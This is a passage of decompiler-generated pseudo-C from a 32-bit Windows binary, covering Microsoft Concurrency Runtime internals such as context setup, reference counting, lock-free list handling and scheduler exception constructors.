    LOBYTE(v4[1]) = a1;
    BYTE1(v4[1]) = a2;
    v4[6] = dword_4C0F6C[0];
    v4[7] = dword_4C0F6C[1];
    v4[8] = dword_4C0F6C[2];
    v4[9] = dword_4C0F6C[3];
    v4[13] = a3;
    return sub_47C0C1((_DWORD *)dword_4F0C68, dword_4F0C60, dword_4F0C64, (int)v4);
  }
  return result;
}
// 4C0F6C: using guessed type _DWORD dword_4C0F6C[4];
// 4F0C60: using guessed type int dword_4F0C60;
// 4F0C64: using guessed type int dword_4F0C64;
// 4F0C68: using guessed type int dword_4F0C68;

//----- (00477544) --------------------------------------------------------
int __stdcall sub_477544(char a1, unsigned __int8 a2, int a3)
{
  int result; // eax

  if ( a2 <= (unsigned __int8)byte_4F0C5C )
  {
    result = dword_4F0C58;
    if ( (dword_4F0C58 & 1) != 0 )
      return sub_4774D9(a1, a2, a3);
  }
  return result;
}
// 4F0C58: using guessed type int dword_4F0C58;
// 4F0C5C: using guessed type char byte_4F0C5C;

//----- (0047756E) --------------------------------------------------------
int __thiscall sub_47756E(int this, _DWORD *a2)
{
  _DWORD *v3; // edi

  v3 = (_DWORD *)(this + 324);
  sub_46FC7F((volatile __int32 *)(this + 324));
  if ( *a2 != *(_DWORD *)(this + 336) )
    sub_476690((volatile signed __int32 *)this);
  return sub_46FCC0(v3);
}

//----- (004775A3) --------------------------------------------------------
int __thiscall sub_4775A3(_DWORD *this)
{
  if ( sub_4753F1(this) || sub_47541B(this) )
    return 1;
  if ( (int)this[121] <= 0 )
    return 0;
  return 2;
}

//----- (004775D1) --------------------------------------------------------
int __thiscall sub_4775D1(_DWORD *this, int a2)
{
  if ( a2 == -1 )
  {
    this[85] = 0;
    this[86] = sub_474DA2(this);
  }
  else
  {
    this[85] = a2;
  }
  if ( this[85] == this[86] )
    return 0;
  else
    return this[86];
}

//----- (00477619) --------------------------------------------------------
unsigned int __thiscall sub_477619(_DWORD *this)
{
  unsigned int v2; // ecx
  unsigned int result; // eax

  v2 = sub_474DA2(this);
  if ( v2 <= this[86] )
    return 0;
  if ( this[86] == this[85] )
    result = v2;
  else
    result = 0;
  this[86] = v2;
  return result;
}

//----- (0047764B) --------------------------------------------------------
char __thiscall sub_47764B(volatile signed __int32 *this, int a2)
{
  volatile signed __int32 *v3; // esi
  signed __int32 v4; // eax
  int v5; // edx

  if ( (_BYTE)a2 )
  {
    v3 = this + 101;
    v4 = *((_DWORD *)this + 101);
    while ( 1 )
    {
      v5 = v4;
      if ( (v4 & 0x40000000) != 0 )
        v5 = sub_476FC1((int *)this + 101, 0x40000000);
      if ( (v5 & 0x20000000) != 0 )
        break;
      v4 = _InterlockedCompareExchange(v3, v5 + 1, v5);
      if ( v4 == v5 )
      {
        (*(void (__thiscall **)(volatile signed __int32 *, int, signed __int32))(*this + 68))(
          this,
          a2,
          _InterlockedIncrement(this + 108));
        return 1;
      }
    }
    return 0;
  }
  else
  {
    (*(void (__thiscall **)(volatile signed __int32 *, _DWORD, signed __int32))(*this + 68))(
      this,
      0,
      _InterlockedDecrement(this + 108));
    if ( (_InterlockedDecrement(this + 101) & 0x9FFFFFFF) == 0x80000000 )
      sub_474A5B(this);
    return 1;
  }
}

//----- (004776FF) --------------------------------------------------------
int __thiscall sub_4776FF(int this, char a2)
{
  volatile signed __int32 *v3; // ecx

  sub_478772();
  v3 = (volatile signed __int32 *)(this + 404);
  if ( a2 )
  {
    if ( (_InterlockedDecrement(v3) & 0x9FFFFFFF) == 0x80000000 )
      sub_474A5B((volatile signed __int32 *)this);
  }
  else if ( (_InterlockedIncrement(v3) & 0x40000000) != 0 )
  {
    WaitForSingleObjectEx(*(HANDLE *)(this + 380), 0xFFFFFFFF, 0);
  }
  return sub_478772();
}
// 478772: using guessed type int sub_478772(void);

//----- (0047775C) --------------------------------------------------------
void __thiscall sub_47775C(int *this)
{
  int i; // ebx
  _DWORD *v3; // eax
  _DWORD *v4; // esi
  int v5; // eax

  if ( this[1] > 0 )
  {
    for ( i = 0; i < *this; ++i )
    {
      v3 = *(_DWORD **)(this[2] + 4 * i);
      if ( v3 )
      {
        do
        {
          v4 = (_DWORD *)*v3;
          sub_46C87D(v3);
          v3 = v4;
        }
        while ( v4 );
      }
    }
    v5 = *this;
    this[1] = 0;
    memset((void *)this[2], 0, 4 * v5);
  }
}

//----- (004777A9) --------------------------------------------------------
int __thiscall sub_4777A9(int *this, _DWORD *a2)
{
  int result; // eax

  *this ^= (*this ^ *a2) & 0xFFFFFFF;
  *this = *a2 ^ (*this ^ *a2) & 0xFFFFFFF;
  this[2] = a2[2];
  this[1] = a2[1];
  result = a2[3];
  this[3] = result;
  return result;
}

//----- (00477800) --------------------------------------------------------
char *__thiscall sub_477800(char *this, int a2)
{
  sub_401710(this, a2);
  *(_DWORD *)this = &Concurrency::improper_lock::`vftable';
  return this;
}
// 4C08C0: using guessed type void *Concurrency::improper_lock::`vftable';

//----- (0047784E) --------------------------------------------------------
char *__thiscall sub_47784E(char *this, int a2)
{
  sub_401710(this, a2);
  *(_DWORD *)this = &Concurrency::invalid_scheduler_policy_key::`vftable';
  return this;
}
// 4C0B9C: using guessed type void *Concurrency::invalid_scheduler_policy_key::`vftable';

//----- (0047787A) --------------------------------------------------------
char *__thiscall sub_47787A(char *this, int a2)
{
  sub_401710(this, a2);
  *(_DWORD *)this = &Concurrency::invalid_scheduler_policy_value::`vftable';
  return this;
}
// 4C0BA8: using guessed type void *Concurrency::invalid_scheduler_policy_value::`vftable';

//----- (004778B7) --------------------------------------------------------
_DWORD *__thiscall sub_4778B7(_DWORD *this, int a2)
{
  _DWORD *result; // eax

  this[1] = 0;
  this[2] = 0;
  this[3] = a2;
  result = this;
  *this = &Concurrency::scheduler_resource_allocation_error::`vftable';
  return result;
}
// 4C08E0: using guessed type void *Concurrency::scheduler_resource_allocation_error::`vftable';

//----- (004778D4) --------------------------------------------------------
_DWORD *__thiscall sub_4778D4(_DWORD *this, int a2)
{
  _DWORD *result; // eax

  this[1] = 0;
  this[2] = 0;
  this[3] = a2;
  result = this;
  *this = &Concurrency::scheduler_worker_creation_error::`vftable';
  return result;
}
// 4C0B6C: using guessed type void *Concurrency::scheduler_worker_creation_error::`vftable';

//----- (00477902) --------------------------------------------------------
_DWORD *__thiscall sub_477902(_DWORD *this)
{
  *this = 0;
  this[1] = 0;
  this[2] = unknown_libname_28(16);
  return this;
}
// 46D404: using guessed type int __cdecl unknown_libname_28(_DWORD);

//----- (0047791B) --------------------------------------------------------
void *__thiscall sub_47791B(void *this, int a2, char a3)
{
  signed __int32 v4; // eax
  int v5; // edi
  int v6; // eax
  int v8; // [esp-4h] [ebp-24h]

  *((_DWORD *)this + 15) = -1;
  *((_DWORD *)this + 7) = a2;
  *(_DWORD *)this = &Concurrency::details::ContextBase::`vftable';
  *((_DWORD *)this + 3) = 0;
  *((_DWORD *)this + 4) = 0;
  *((_DWORD *)this + 5) = 0;
  *((_DWORD *)this + 8) = 0;
  *((_DWORD *)this + 9) = 0;
  *((_DWORD *)this + 10) = 1;
  *((_DWORD *)this + 11) = 0;
  *((_DWORD *)this + 12) = 0;
  *((_DWORD *)this + 13) = 0;
  *((_DWORD *)this + 14) = 0;
  *((_DWORD *)this + 16) = 0;
  *((_DWORD *)this + 17) = 0;
  *((_BYTE *)this + 76) = a3;
  *((_DWORD *)this + 20) = 0;
  sub_46ED55((_DWORD *)this + 21);
  *((_DWORD *)this + 25) = 0;
  *((_DWORD *)this + 26) = -1;
  *((_DWORD *)this + 27) = -1;
  *((_DWORD *)this + 28) = 0;
  *((_DWORD *)this + 29) = 0;
  *((_DWORD *)this + 30) = 0;
  *((_DWORD *)this + 31) = 0;
  sub_473C69((unsigned int *)this + 32, 7u);
  sub_477902((_DWORD *)this + 35);
  v4 = sub_4757C1(*((volatile signed __int32 **)this + 7));
  v5 = *((_DWORD *)this + 7);
  *((_DWORD *)this + 2) = v4;
  v8 = v4;
  v6 = (*(int (__thiscall **)(int))(*(_DWORD *)v5 + 4))(v5);
  sub_47890F(1, 4u, v6, v8);
  return this;
}
// 4C0BF4: using guessed type void *Concurrency::details::ContextBase::`vftable';

//----- (004779ED) --------------------------------------------------------
void __thiscall sub_4779ED(void **this)
{
  j_j_j___free_base(this[3]);
  j_j_j___free_base(this[4]);
}

//----- (00477A04) --------------------------------------------------------
void __thiscall sub_477A04(void **this)
{
  j_j_j___free_base(this[7]);
  j_j_j___free_base(this[8]);
}

//----- (00477A1B) --------------------------------------------------------
void __thiscall sub_477A1B(int this)
{
  int v2; // edi
  int v3; // esi

  if ( *(int *)(this + 4) > 0 )
  {
    v2 = **(_DWORD **)(this + 8);
    if ( v2 )
    {
      do
      {
        v3 = *(_DWORD *)(v2 + 4);
        j_j_j___free_base(*(void **)v2);
        sub_46C87D((void *)v2);
        v2 = v3;
      }
      while ( v3 );
    }
  }
  j_j_j___free_base(*(void **)(this + 8));
}

//----- (00477A57) --------------------------------------------------------
void __thiscall sub_477A57(_DWORD *this)
{
  *this = &Concurrency::Context::`vftable';
}
// 4C0BD8: using guessed type void *Concurrency::Context::`vftable';

//----- (00477A5E) --------------------------------------------------------
void __thiscall sub_477A5E(void *this)
{
  sub_477A1B((int)this + 140);
  sub_47775C((int *)this + 32);
  j_j_j___free_base(*((void **)this + 34));
  *(_DWORD *)this = &Concurrency::Context::`vftable';
}
// 4C0BD8: using guessed type void *Concurrency::Context::`vftable';

//----- (00477A8C) --------------------------------------------------------
void __thiscall sub_477A8C(void **this)
{
  j_j_j___free_base(this[3]);
  j_j_j___free_base(this[2]);
}

//----- (00477AA3) --------------------------------------------------------
void __thiscall sub_477AA3(void *this)
{
  sub_46F19B((volatile signed __int32 *)(*(_DWORD *)this + 4));
}

//----- (00477ADC) --------------------------------------------------------
bool __thiscall sub_477ADC(_DWORD *this, _DWORD *a2)
{
  return ((*this ^ *a2) & 0xFFFFFFF) == 0 && this[2] == a2[2];
}

//----- (00477AFF) --------------------------------------------------------
int __thiscall sub_477AFF(_DWORD *this, int a2)
{
  int v2; // ecx
  int v3; // eax
  _DWORD *v4; // ecx
  int i; // eax

  v2 = this[2];
  v3 = a2 >> 4;
  if ( a2 >> 4 >= 4 )
  {
    v4 = *(_DWORD **)(v2 + 12);
    for ( i = v3 - 3; i; --i )
      v4 = (_DWORD *)v4[1];
  }
  else
  {
    v4 = *(_DWORD **)(v2 + 4 * v3);
  }
  return *v4 + 8 * (a2 & 0xF);
}

//----- (00477B33) --------------------------------------------------------
_DWORD *__thiscall sub_477B33(_DWORD *this, char a2)
{
  *this = &Concurrency::Context::`vftable';
  if ( (a2 & 1) != 0 )
    sub_46C87D(this);
  return this;
}
// 4C0BD8: using guessed type void *Concurrency::Context::`vftable';

//----- (00477B56) --------------------------------------------------------
void *__thiscall sub_477B56(void *this, char a2)
{
  sub_477A5E(this);
  if ( (a2 & 1) != 0 )
    sub_46C87D(this);
  return this;
}

//----- (00477B7B) --------------------------------------------------------
void **__thiscall sub_477B7B(void **this, char a2)
{
  sub_477A04(this + 19);
  sub_4779ED(this);
  if ( (a2 & 1) != 0 )
    sub_46C87D(this);
  return this;
}

//----- (00477BA7) --------------------------------------------------------
int __thiscall sub_477BA7(int this, signed __int32 a2)
{
  int v3; // edi
  int v4; // ebx
  volatile signed __int32 *v5; // edx
  volatile signed __int32 *v6; // eax
  signed __int32 v7; // edx
  int v8; // eax
  volatile signed __int32 *v9; // edi
  signed __int32 v10; // eax
  volatile __int32 *v11; // edi
  _DWORD *v12; // eax
  int *v13; // ecx
  int v14; // eax
  signed __int32 v15; // eax
  int v16; // edx
  size_t v18; // [esp-8h] [ebp-38h]
  char v19[8]; // [esp+Ch] [ebp-24h] BYREF
  int v20; // [esp+14h] [ebp-1Ch]
  int (*v21)(); // [esp+18h] [ebp-18h]
  _DWORD *v22; // [esp+1Ch] [ebp-14h]
  int *v23; // [esp+20h] [ebp-10h]
  volatile signed __int32 *v24; // [esp+24h] [ebp-Ch]
  int *v25; // [esp+28h] [ebp-8h]
  char v26; // [esp+2Fh] [ebp-1h]

  v26 = 0;
  v3 = 0;
  v25 = 0;
  v4 = *(_DWORD *)(this + 48);
  do
  {
    v5 = (volatile signed __int32 *)(v4 + 8);
    if ( *(int *)(v4 + 8) < -1 )
      goto LABEL_9;
    v6 = *(volatile signed __int32 **)v4;
    v7 = 0;
    v24 = *(volatile signed __int32 **)v4;
    if ( *(int *)(this + 40) <= 0 )
    {
LABEL_8:
      v5 = (volatile signed __int32 *)(v4 + 8);
      goto LABEL_9;
    }
    while ( *v6 )
    {
LABEL_7:
      ++v7;
      v24 = ++v6;
      if ( v7 >= *(_DWORD *)(this + 40) )
        goto LABEL_8;
    }
    v8 = v7 + v3;
    v9 = v24;
    v23 = (int *)v8;
    *(_DWORD *)(a2 + 68) = v8;
    v22 = *(_DWORD **)(this + 64);
    v10 = _InterlockedCompareExchange(v9, a2, 0);
    v3 = (int)v25;
    if ( v10 )
    {
      v6 = v24;
      goto LABEL_7;
    }
    v3 = (int)v23;
    v26 = 1;
    v25 = v23;
    if ( (int)v23 >= (int)v22 )
      _InterlockedIncrement((volatile signed __int32 *)(this + 64));
    v15 = v7;
    v5 = (volatile signed __int32 *)(v4 + 8);
    _InterlockedCompareExchange((volatile signed __int32 *)(v4 + 8), -1, v15);
LABEL_9:
    if ( !v26 )
    {
      _InterlockedCompareExchange(v5, -2, -1);
      v25 = (int *)(*(_DWORD *)(this + 40) + v3);
      v11 = (volatile __int32 *)(v4 + 4);
      if ( !*(_DWORD *)(v4 + 4) && !_InterlockedCompareExchange(v11, 1, 0) )
      {
        v12 = (_DWORD *)unknown_libname_28((unsigned __int64)*(unsigned int *)(this + 40) >> 30 != 0 ? -1 : 4 * *(_DWORD *)(this + 40));
        v18 = 4 * *(_DWORD *)(this + 40);
        v22 = v12;
        memset(v12, 0, v18);
        v13 = (int *)operator new(0xCu);
        v23 = v13;
        if ( v13 )
        {
          v14 = (int)v22;
          v13[1] = 0;
          v13[2] = -1;
          *v13 = v14;
        }
        else
        {
          v13 = 0;
        }
        v16 = *(_DWORD *)(this + 60);
        if ( v16 < *(_DWORD *)(this + 56) )
        {
          *(_DWORD *)(*(_DWORD *)(this + 52) + 4 * v16) = v13;
          ++*(_DWORD *)(this + 60);
        }
        _InterlockedExchange(v11, (__int32)v13);
      }
      if ( *v11 == 1 )
      {
        v20 = 0;
        v21 = sub_46FD09;
        do
          sub_46E3D5((int)v19);
        while ( *v11 == 1 );
      }
    }
    v4 = *(_DWORD *)(v4 + 4);
    v3 = (int)v25;
  }
  while ( !v26 );
  return (int)v25;
}
// 46C4D2: using guessed type void *__cdecl operator new(size_t Size);
// 46D404: using guessed type int __cdecl unknown_libname_28(_DWORD);
// 477BA7: using guessed type char var_24[8];

//----- (00477D09) --------------------------------------------------------
void __thiscall sub_477D09(volatile signed __int32 *this, int a2, char a3)
{
  sub_477D62((int)(this + 20), (_DWORD *)(a2 + 92));
  *(_BYTE *)(a2 + 77) = 1;
  if ( a3 )
    _InterlockedDecrement(this + 25);
}

//----- (00477D33) --------------------------------------------------------
int __thiscall sub_477D33(int *this, _DWORD *a2)
{
  int result; // eax

  result = *this;
  if ( *this )
  {
    a2[1] = *(_DWORD *)(result + 4);
    *a2 = *this;
    **(_DWORD **)(*this + 4) = a2;
    result = *this;
    *(_DWORD *)(*this + 4) = a2;
  }
  else
  {
    a2[1] = a2;
    *a2 = a2;
  }
  *this = (int)a2;
  return result;
}

//----- (00477D62) --------------------------------------------------------
void __thiscall sub_477D62(int this, _DWORD *a2)
{
  sub_46F085((volatile signed __int32 *)(this + 4));
  sub_477D33((int *)this, a2);
  sub_46F19F((volatile signed __int32 *)(this + 4));
}

//----- (00477D96) --------------------------------------------------------
void __thiscall sub_477D96(int this, signed __int32 a2)
{
  signed __int32 i; // edx
  signed __int32 v4; // eax
  int v5; // eax
  volatile signed __int32 *v6; // esi
  signed __int32 j; // edx
  signed __int32 v8; // eax

  _InterlockedIncrement((volatile signed __int32 *)(this + 112));
  for ( i = *(_DWORD *)(this + 104); i == -1 || a2 <= i; i = v4 )
  {
    v4 = _InterlockedCompareExchange((volatile signed __int32 *)(this + 104), a2, i);
    if ( v4 == i )
    {
      if ( *(_DWORD *)(this + 116) )
        v5 = -1;
      else
        v5 = a2;
      sub_478257((_DWORD *)this, v5);
      break;
    }
  }
  v6 = (volatile signed __int32 *)(this + 108);
  for ( j = *v6; j == -1 || a2 >= j; j = v8 )
  {
    v8 = _InterlockedCompareExchange(v6, a2, j);
    if ( v8 == j )
      break;
  }
}

//----- (00477DFD) --------------------------------------------------------
signed __int32 __thiscall sub_477DFD(volatile signed __int32 *this, signed __int32 a2)
{
  signed __int32 v3; // ebx

  _InterlockedCompareExchange(this + 26, -1, a2);
  sub_4784AE((int)this);
  v3 = 1 - _InterlockedExchangeAdd(this + 28, 0xFFFFFFFF);
  LOBYTE(v3) = -(v3 != 0);
  return v3 + 1;
}

//----- (00477E2D) --------------------------------------------------------
void __thiscall sub_477E2D(int this, int a2)
{
  int *v2; // edi
  int v3; // esi
  bool i; // zf
  int v5; // edx
  int v6; // eax
  int v7; // ecx
  volatile signed __int32 *v8; // [esp+14h] [ebp-14h]

  v2 = (int *)(this + 80);
  v8 = (volatile signed __int32 *)(this + 84);
  sub_46F055((volatile signed __int32 *)(this + 84));
  v3 = *v2;
  for ( i = *v2 == 0; ; i = v3 == *v2 )
  {
    v3 = i ? 0 : *(_DWORD *)(v3 + 4);
    if ( !v3 )
      break;
    if ( *(_DWORD *)(v3 + 24) )
      continue;
    v5 = *(_DWORD *)(v3 - 44);
    if ( v5 == a2 )
    {
LABEL_11:
      _InterlockedExchange((volatile __int32 *)(v3 + 24), 1);
      sub_477D96(v3 - 92, -999);
      sub_477E2D(0);
      continue;
    }
    if ( a2 )
    {
      v7 = (16 * *(_DWORD *)(a2 + 4)) >> 4;
      if ( v7 == -1 )
        continue;
      v6 = (16 * *(_DWORD *)(v5 + 4)) >> 4;
      if ( v6 <= v7 )
        continue;
    }
    else
    {
      v6 = (16 * *(_DWORD *)(v5 + 4)) >> 4;
      if ( v6 == -1 )
        continue;
    }
    if ( *(_DWORD *)(this + 60) == -1 || sub_4782F0((_DWORD *)this, v5, v6) )
      goto LABEL_11;
  }
  sub_46F19B(v8);
}

//----- (00477F1D) --------------------------------------------------------
char __cdecl sub_477F1D(int a1)
{
  char result; // al

  result = sub_475B2C(*(_DWORD **)(a1 + 36));
  if ( !result )
  {
    sub_478070(*(_DWORD **)(a1 + 16));
    *(_DWORD *)(a1 + 16) = 0;
    result = a1 + 72;
    _InterlockedExchange((volatile __int32 *)(a1 + 72), 0);
  }
  return result;
}

//----- (00477F29) --------------------------------------------------------
char __thiscall sub_477F29(int *this, _DWORD *a2)
{
  int v2; // edi

  v2 = *(_DWORD *)(*(_DWORD *)(*this + 12) + 4 * this[1]);
  if ( v2 == 1 || _InterlockedExchange((volatile __int32 *)(*(_DWORD *)(*this + 12) + 4 * this[1]), 1) != v2 )
  {
    sub_478092(*this);
    return 0;
  }
  else
  {
    if ( a2 )
      *a2 = v2;
    return 1;
  }
}

//----- (00477F70) --------------------------------------------------------
int __thiscall sub_477F70(int this)
{
  int v2; // eax
  int v4; // [esp-4h] [ebp-10h]

  sub_478536((int *)this);
  v4 = *(_DWORD *)(this + 8);
  v2 = (*(int (__thiscall **)(_DWORD))(**(_DWORD **)(this + 28) + 4))(*(_DWORD *)(this + 28));
  return sub_47890F(2, 4u, v2, v4);
}

//----- (00477FA1) --------------------------------------------------------
void __thiscall sub_477FA1(int *this)
{
  int *v1; // edi
  int v2; // esi
  int v3; // [esp+8h] [ebp-4h] BYREF

  v3 = 0;
  v1 = this + 32;
  while ( 1 )
  {
    v2 = sub_4783F3(v1, &v3);
    if ( !v2 )
      break;
    do
    {
      sub_4797E9(*(volatile signed __int32 **)(v2 + 8));
      v2 = *(_DWORD *)v2;
    }
    while ( v2 );
    ++v3;
  }
  sub_47775C(v1);
}

//----- (00477FE0) --------------------------------------------------------
BOOL sub_477FE0()
{
  return sub_46F93E(dword_4F0C08, 0);
}
// 4F0C08: using guessed type int dword_4F0C08;

//----- (00477FF0) --------------------------------------------------------
int __thiscall sub_477FF0(int this)
{
  int v2; // eax
  PSLIST_ENTRY v3; // eax
  _DWORD *v4; // edi
  volatile __int32 *v5; // ecx
  _DWORD *v6; // eax
  int result; // eax

  v2 = sub_47F98D(*(union _SLIST_HEADER **)(this + 24));
  *(_DWORD *)(this + 32) = v2;
  if ( !v2 )
  {
    v3 = InterlockedPopEntrySList((PSLIST_HEADER)(*(_DWORD *)(this + 24) + 88));
    v4 = 0;
    v5 = 0;
    if ( v3 )
      v5 = (volatile __int32 *)&v3[-6];
    *(_DWORD *)(this + 32) = v5;
    if ( v5 )
    {
      sub_480E3A(v5);
      v4 = *(_DWORD **)(this + 32);
    }
    else
    {
      v6 = operator new(0x74u);
      if ( v6 )
        v4 = sub_480DCC(v6);
      *(_DWORD *)(this + 32) = v4;
    }
    sub_477BA7(*(_DWORD *)(this + 24) + 88, (signed __int32)v4);
  }
  result = *(_DWORD *)(this + 32);
  *(_DWORD *)(result + 72) = this;
  return result;
}
// 46C4D2: using guessed type void *__cdecl operator new(size_t Size);

//----- (00478070) --------------------------------------------------------
void **__stdcall sub_478070(_DWORD *a1)
{
  void **v2; // ecx
  void **result; // eax

  while ( a1 )
  {
    v2 = (void **)(a1 - 6);
    a1 = (_DWORD *)*a1;
    if ( v2 )
      result = sub_477B7B(v2, 1);
  }
  return result;
}

//----- (00478092) --------------------------------------------------------
int __thiscall sub_478092(int this)
{
  int result; // eax

  result = _InterlockedExchangeAdd((volatile signed __int32 *)(this + 20), 0xFFFFFFFF);
  if ( !result )
    return sub_4761CF(
             (int (__cdecl **)(int))(this + 28),
             (int (__cdecl *)(int))sub_478753,
             (int (__cdecl *)(int))this,
             *(_DWORD *)this);
  return result;
}

//----- (004780AD) --------------------------------------------------------
char __thiscall sub_4780AD(int *this)
{
  char result; // al
  int v3; // esi
  int v4; // esi
  bool v5; // zf
  _DWORD *v6; // esi
  _DWORD v7[5]; // [esp+10h] [ebp-3Ch] BYREF
  char *v8; // [esp+24h] [ebp-28h]
  int v9; // [esp+28h] [ebp-24h]
  int v10; // [esp+2Ch] [ebp-20h]
  bool v11; // [esp+32h] [ebp-1Ah]
  char v12; // [esp+33h] [ebp-19h]
  CPPEH_RECORD ms_exc; // [esp+34h] [ebp-18h]

  v7[4] = this;
  if ( this[25] )
  {
    v7[2] = 0;
    v7[3] = sub_46FD09;
    do
      sub_46E45E(v7);
    while ( this[25] );
  }
  if ( this[33] > 0 )
    sub_477FA1(this);
  if ( !this[20] )
    return sub_46F14E(this + 21);
  result = 0;
  v11 = 0;
  while ( !result )
  {
    v12 = 1;
    sub_46F085(this + 21);
    ms_exc.registration.TryLevel = 0;
    v12 = 1;
    v3 = this[20];
    if ( v3 )
      v4 = *(_DWORD *)(v3 + 4);
    else
      v4 = 0;
    while ( 1 )
    {
      v5 = v4 == 0;
      if ( !v4 )
        break;
      if ( v4 == this[20] )
        v10 = 0;
      else
        v10 = *(_DWORD *)(v4 + 4);
      v9 = v4 - 92;
      v8 = sub_417D60(*(char **)(v4 - 92 + 48));
      if ( !sub_46F1F9((volatile signed __int32 *)v8 + 1) )
      {
        sub_46F19F(this + 21);
        v12 = 0;
        sub_46F8D1(1u);
        v5 = v4 == 0;
        break;
      }
      ms_exc.registration.TryLevel = 1;
      v6 = (_DWORD *)(v9 + 92);
      sub_4785DB(this + 20, (_DWORD **)(v9 + 92));
      *(_BYTE *)(v9 + 77) = 0;
      sub_477D33((int *)v8, v6);
      ms_exc.registration.TryLevel = 0;
      v4 = v10;
      sub_46F19F((volatile signed __int32 *)v8 + 1);
    }
    v11 = v5;
    ms_exc.registration.TryLevel = -2;
    if ( v12 )
      sub_46F19F(this + 21);
    result = v11;
  }
  return result;
}

//----- (004781EF) --------------------------------------------------------
int __thiscall sub_4781EF(_DWORD *this)
{
  int result; // eax

  result = this[3] + 1;
  this[3] = result;
  return result;
}

//----- (004781F7) --------------------------------------------------------
int __thiscall sub_4781F7(_DWORD *this)
{
  int v1; // eax
  int result; // eax

  v1 = this[4];
  ++this[3];
  result = v1 + 1;
  this[4] = result;
  return result;
}

//----- (00478202) --------------------------------------------------------
int __thiscall sub_478202(_DWORD *this)
{
  int result; // eax

  result = this[3] - 1;
  this[3] = result;
  return result;
}

//----- (0047820A) --------------------------------------------------------
int __thiscall sub_47820A(_DWORD *this)
{
  int v1; // eax
  int result; // eax

  v1 = this[4];
  --this[3];
  result = v1 - 1;
  this[4] = result;
  return result;
}

//----- (00478215) --------------------------------------------------------
char __thiscall sub_478215(unsigned int *this, _DWORD *a2, _DWORD *a3)
{
  int v4; // eax
  _DWORD *v5; // eax

  v4 = sub_475B3F((int)a2, *this);
  v5 = sub_47858D(this, a2, v4);
  if ( !v5 )
    return 0;
  if ( a3 )
    *a3 = v5[2];
  sub_46C87D(v5);
  return 1;
}

//----- (00478257) --------------------------------------------------------
_DWORD *__thiscall sub_478257(_DWORD *this, int a2)
{
  int v3; // esi
  _DWORD *result; // eax
  int v5; // edi
  int v6; // ecx

  v3 = 0;
  result = this + 35;
  v5 = this[35];
  if ( v5 > 0 )
  {
    do
    {
      v6 = sub_477AFF(result, v3);
      if ( *(_DWORD *)(v6 + 4) >= a2 && (this[15] == -1 || this[15] <= a2) )
        _InterlockedIncrement((volatile signed __int32 *)v6);
      ++v3;
      result = this + 35;
    }
    while ( v3 < v5 );
  }
  return result;
}

//----- (0047829F) --------------------------------------------------------
int __thiscall sub_47829F(_DWORD *this)
{
  if ( this[4] )
    return 2;
  else
    return this[3] != 0;
}

//----- (004782B3) --------------------------------------------------------
int __thiscall sub_4782B3(_DWORD *this)
{
  return this[31];
}

//----- (004782B7) --------------------------------------------------------
int __thiscall sub_4782B7(_DWORD *this)
{
  int v1; // eax

  v1 = this[6];
  if ( v1 )
    return *(_DWORD *)(v1 + 256);
  else
    return 0;
}

//----- (004782C8) --------------------------------------------------------
int __thiscall sub_4782C8(_DWORD *this)
{
  int v1; // edi

  v1 = this[6];
  if ( v1 )
    return (*(int (__thiscall **)(_DWORD))(**(_DWORD **)(v1 + 256) + 4))(*(_DWORD *)(v1 + 256));
  else
    return -1;
}

//----- (004782F0) --------------------------------------------------------
bool __thiscall sub_4782F0(_DWORD *this, int a2, int a3)
{
  int v4; // eax
  int v5; // esi
  int v6; // eax
  char v8; // al

  if ( (int)this[28] <= 0 || this[26] > a3 )
    return 0;
  if ( this[15] != -1 && this[26] < this[15] )
  {
    v4 = this[13];
    v5 = a2;
    if ( a2 == v4 && a3 == (16 * *(_DWORD *)(v4 + 4)) >> 4 )
    {
      v6 = this[14];
LABEL_8:
      if ( v6 != 2 )
        return *(_DWORD *)(v6 + 8) != 0;
    }
    else
    {
      do
      {
        if ( v5 == this[12] )
          break;
        if ( (16 * *(_DWORD *)(v5 + 4)) >> 4 == a3 )
          break;
        v5 = sub_4789AE((_DWORD *)v5);
      }
      while ( v5 );
      while ( v5 )
      {
        if ( v5 == this[12] || sub_480C27((_DWORD *)v5, 0) )
        {
          if ( v5 == this[12] )
            return 0;
          v6 = sub_480C27((_DWORD *)v5, 0);
          goto LABEL_8;
        }
        v8 = (*(int *)(v5 + 4) >> 28) & 1;
        if ( v8 && (*(_BYTE *)(v5 + 24) & 3) != 0 || !v8 && sub_4796AD((_DWORD *)v5) )
          return 1;
        v5 = sub_4789AE((_DWORD *)v5);
      }
    }
    return 0;
  }
  return 1;
}
// 4783B7: conditional instruction was optimized away because esi.4!=0

//----- (004783D0) --------------------------------------------------------
int __thiscall sub_4783D0(int this, int a2)
{
  sub_46FC7F((volatile __int32 *)(this + 112));
  *(_DWORD *)(this + 72) = a2;
  return sub_46FCC0((_DWORD *)(this + 112));
}

//----- (004783F3) --------------------------------------------------------
int __thiscall sub_4783F3(int *this, int *a2)
{
  int v2; // edx
  _DWORD *i; // eax

  v2 = *a2;
  if ( *a2 >= *this )
    return 0;
  for ( i = (_DWORD *)(this[2] + 4 * v2); !*i; ++i )
  {
    if ( ++v2 >= *this )
      return 0;
  }
  *a2 = v2;
  return *(_DWORD *)(this[2] + 4 * v2);
}

//----- (00478424) --------------------------------------------------------
int __thiscall sub_478424(__int32 *this)
{
  volatile __int32 *v1; // edi
  __int32 v2; // edx
  int v3; // esi
  int v4; // ebx

  v1 = this + 1;
  do
  {
    v2 = *v1 - 1;
    _InterlockedExchange(v1, v2);
    if ( *this > v2 )
    {
      *v1 = v2 + 1;
      return sub_478805(this);
    }
    v3 = v2 & this[2];
    v4 = *(_DWORD *)(this[7] + 4 * v3);
  }
  while ( !v4 );
  if ( (v4 & 1) == 0 )
    return v4;
  v4 &= ~1u;
  if ( sub_477F29((int *)(this[8] + 8 * v3), 0) )
    return v4;
  else
    return 1;
}

//----- (00478475) --------------------------------------------------------
void *__thiscall sub_478475(_DWORD *this)
{
  void *v2; // esi

  v2 = (void *)this[9];
  sub_46F93E(dword_4F0C08, v2);
  this[9] = 0;
  return v2;
}
// 4F0C08: using guessed type int dword_4F0C08;

//----- (00478493) --------------------------------------------------------
BOOL __thiscall sub_478493(_DWORD *this, int a2)
{
  this[9] = a2;
  return sub_46F93E(dword_4F0C08, this);
}
// 4F0C08: using guessed type int dword_4F0C08;

//----- (004784AE) --------------------------------------------------------
char __thiscall sub_4784AE(int this)
{
  int v2; // eax
  int v3; // edi
  int v4; // esi
  bool v5; // zf
  signed __int32 i; // edx
  volatile signed __int32 *v8; // [esp+Ch] [ebp-4h]

  v8 = (volatile signed __int32 *)(this + 108);
  LOBYTE(v2) = _InterlockedExchange((volatile __int32 *)(this + 108), -1);
